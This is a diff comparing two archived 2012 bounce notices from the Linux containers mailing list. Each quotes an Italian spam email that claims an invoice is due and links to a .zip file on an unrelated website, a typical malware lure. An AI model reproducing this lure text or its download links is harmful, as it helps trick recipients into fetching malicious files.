@@ -1,9 +1,10 @@
-From: postmaster-/AMyLejUuw9eoWH0uzbU5w@public.gmane.org
-Subject: Notifica sullo stato del recapito (Errore)
-Date: Mon, 30 Jan 2012 11:41:27 +0100
-Message-ID: <ZIhW0Vfrk00000f0e@mail.tucano.it>
+From: MAILER-DAEMON-whZMOeQn8C0@public.gmane.org
+Subject: Delivery failure
+Date: Mon, 30 Jan 2012 05:45:43 -0800 (PST)
+Message-ID: <280698.96165.bm@omp1015.mail.ukl.yahoo.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===============3674589544063790346=="
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
@@ -17,84 +18,75 @@ Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public
 To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-This is a MIME-formatted message.  
-Portions of this message may be unreadable without a MIME-capable mail program.
+Message from yahoo.it.
+Unable to deliver message to the following address(es).
 
---===============3674589544063790346==
-Content-Type: multipart/report; report-type=delivery-status;
-	boundary="9B095B5ADSN=_01CCD05D5F34190C0000241Cmail.tucano.it"
+<mecapiscusulu-whZMOeQn8C0@public.gmane.org>:
+Sorry your message to mecapiscusulu-whZMOeQn8C0@public.gmane.org cannot be delivered. This account has been disabled or discontinued [#102].
 
-This is a MIME-formatted message.  
-Portions of this message may be unreadable without a MIME-capable mail program.
+--- Original message follows.
 
---9B095B5ADSN=_01CCD05D5F34190C0000241Cmail.tucano.it
-Content-Type: text/plain; charset=unicode-1-1-utf-7
-
-Notifica sullo stato del recapito generata automaticamente.
-
-Recapito non riuscito per i seguenti destinatari.
-
-       plasmon-/AMyLejUuw9eoWH0uzbU5w@public.gmane.org
-
-
-
-
---9B095B5ADSN=_01CCD05D5F34190C0000241Cmail.tucano.it
-Content-Type: message/delivery-status
-
-Reporting-MTA: dns;mail.tucano.it
-Received-From-MTA: dns;mail1.unnes.ac.id
-Arrival-Date: Mon, 30 Jan 2012 11:41:26 +0100
-
-Final-Recipient: rfc822;plasmon-/AMyLejUuw9eoWH0uzbU5w@public.gmane.org
-Action: failed
-Status: 5.1.1
-
---9B095B5ADSN=_01CCD05D5F34190C0000241Cmail.tucano.it
-Content-Type: message/rfc822
-
-Received: from mail1.unnes.ac.id ([118.97.9.60]) by mail.tucano.it with Microsoft SMTPSVC(6.0.3790.4675);
-	 Mon, 30 Jan 2012 11:41:26 +0100
-Received: from [118.97.9.60] by mail1.unnes.ac.id id 1ld9glSsWB7w with SMTP; Mon, 30 Jan 2012 17:41:25 +0700
-Date: Mon, 30 Jan 2012 17:41:25 +0700
+Return-Path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+X-YahooFilteredBulk: 184.154.61.178
+Received-SPF: fail (domain of lists.linux-foundation.org does not designate 184.154.61.178 as permitted sender)
+X-YMailISG: j3_WYaMWLDvAUiZkuiwDMRpJ.PJJ0U6ssYolrVDNUvH2SPP1
+ bLJCQtl0XFWs1Pp7LqGLUA_TG.Pb4TJhfBmgr7a06jZ.lZp5aeQAE82P.LCf
+ VKq3nRPDUIdjEsDhYtM.5..u4.ST077xrMO5i3d72F_CBKh5nFUoeX7OU0QX
+ YzK5YI3gXZs0TN6.5aZsHcCzU38uLEPK1EKIDbGO4te6KWXMjNzKce2c9vBF
+ OE1vdQ6D6Y_Aq.Cfqlan5d88hcshO8.bWRCdcSRSXYSHqRIaIg4FguQuNLg6
+ SSlzfK4AX66LWiVYL9Lr_1CIbrItrfEkeThv6wFoSiPtXOwX3axNmf183Ehq
+ 1PMqG.etuUsoucE8R60M1xWjn.K0WBJMpSgZNICB_8Adwsn97RpSzCjaQJPV
+ .w9BTQrIB.vxIg7NRF9.hPk6WjUwyrkQxYAg887zZtPha9tkMJrR7HM0hKko
+ l_K8K3G3ym7NS1_QFapEnB0X9EMtArZpmvwix5C6htBY60fJ5V3bkEuuVhzX
+ TN_jlFbTt2Pnnn8QrSCTQBUYbb_kPUfxXy6KBr.fEpVuLJPEX86mHDdDkK3J
+ Bx4cOzNr9R6ZuhGxvmCcCmPvQIkuYqfo4KpKJO7uqh3vP_FI0TBkY5_SGV35
+ ex_A0UhaLMNB1rnQwMrxKw.k1cSXf16jARprZQHnM0mmWNnc2FnY_sZ19L4b
+ kDHAaO.QGF1GHPMwkFP09UAjENCnXhy7KfGO486aYqhb8kRbgllYLIZK7Fhl
+ HtVC1poXUAcc3vjVpun1H9MX4xXeGoHXE0lTm37v96Z37.E_hxuR7o71lHmZ
+ HpQTyRvXQLHRo1msKM5M7yjQZiw8v5M1XN7EiTb7QtkMaKh5mPlzJelt233L
+ yP4wWGUOQK1aGNPJbpxbGJ1jnTh9GLjv9NbLxgVrzfzMrfTxZ0kk_nVAVZhu
+ Nzc3fzySyFpx5Aq.hc6hLaQWNTXNwt2RdGLS.2FAvwRPUzDBvIzAMjY73N1t
+ t4OppLf19pecKTGk15_Q6fYWthnrGUheWT0J8m00acnoYx5bggRuG0op0nek
+ LAPCyQ9J5e3KofWciT7Alw2v7_3T3wg1wT8bxHf.eMuU_pMu6BQ9zfRDGNoI
+ 2rZB
+X-Originating-IP: [184.154.61.178]
+Authentication-Results: mta1047.mail.ukl.yahoo.com  from=lists.linux-foundation.org; domainkeys=neutral (no sig);  from=lists.linux-foundation.org; dkim=neutral (no sig)
+Received: from 127.0.0.1  (EHLO rsx14.justhost.com) (184.154.61.178)
+  by mta1047.mail.ukl.yahoo.com with SMTP; Mon, 30 Jan 2012 13:45:42 +0000
+Received: from [118.97.9.60] (helo=mail1.unnes.ac.id)
+	by rsx14.justhost.com with esmtpa (Exim 4.69)
+	(envelope-from <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>)
+	id 1RrrYC-0005Vj-1i; Mon, 30 Jan 2012 07:45:40 -0600
+Received: from [118.97.9.60] by mail1.unnes.ac.id id 0TAMa3CcB9fA with SMTP; Mon, 30 Jan 2012 20:45:35 +0700
+Date: Mon, 30 Jan 2012 20:45:35 +0700
 From: "inform" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-X-Mailer: The Bat! (v4.4.57.1) Home
-Message-ID: <4621706268.88549224176264-/dYPggjBmVk7HLB1kJ91c2CgeU+1il2p@public.gmane.org>
-To: <plasmon-/AMyLejUuw9eoWH0uzbU5w@public.gmane.org>
-Subject: Proposta di legge 8045507.
+X-Mailer: The Bat! (v4.6.78.7) Home
+X-Priority: 3 (Normal)
+Message-ID: <65786581.97891037053270-/dYPggjBmVk7HLB1kJ91c2CgeU+1il2p@public.gmane.org>
+To: <mecapiscusulu-whZMOeQn8C0@public.gmane.org>
+Subject: Order
 MIME-Version: 1.0
 Content-Type: text/plain;
 	charset="windows-1252"
-X-WatchGuard-Spam-ID: str=0001.0A0B0208.4F2673D7.000A,ss=1,re=0.000,fgs=0
-X-WatchGuard-Spam-Score: 0, clean; 0, no virus
-X-WatchGuard-Mail-Client-IP: 118.97.9.60
-X-WatchGuard-Mail-From: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-Return-Path: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-X-OriginalArrivalTime: 30 Jan 2012 10:41:27.0042 (UTC) FILETIME=[B806CE20:01CCDF3B]
-Content-Transfer-Encoding: quoted-printable
+Content-Transfer-Encoding: 8bit
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - rsx14.justhost.com
+X-AntiAbuse: Original Domain - yahoo.it
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - lists.linux-foundation.org
 
 Gentile cliente.
 
 La fattura deve essere pagato prima della prossima settimana.
 Dettagli possono essere trovati sul sito web ...
-http://www.acquapulita.org/debitodownload/la_fattura.zip
+http://www.bottequa.it/info/informazioni.zip?idown1091749Usera=mecapiscusulu
 
 --
-Tel./Fax.: (151) 305 08 407
+Tel./Fax.: (452) 494 14 953.
 
 
 
+*** MESSAGE TRUNCATED ***
 
---9B095B5ADSN=_01CCD05D5F34190C0000241Cmail.tucano.it--
 
---===============3674589544063790346==
-Content-Type: text/plain; charset="us-ascii"
-MIME-Version: 1.0
-Content-Transfer-Encoding: 7bit
-Content-Disposition: inline
-
-_______________________________________________
-Containers mailing list
-Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-https://lists.linuxfoundation.org/mailman/listinfo/containers
---===============3674589544063790346==--
+.
